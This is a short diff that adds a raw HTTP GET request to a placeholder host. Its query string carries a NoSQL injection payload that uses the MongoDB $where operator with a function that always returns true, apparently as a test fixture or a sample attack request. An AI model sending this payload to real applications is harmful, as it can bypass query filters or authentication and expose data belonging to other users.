@@ -1,0 +1,4 @@
+GET /a?id="user[$where]%3Dfunction(){return%20true}" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
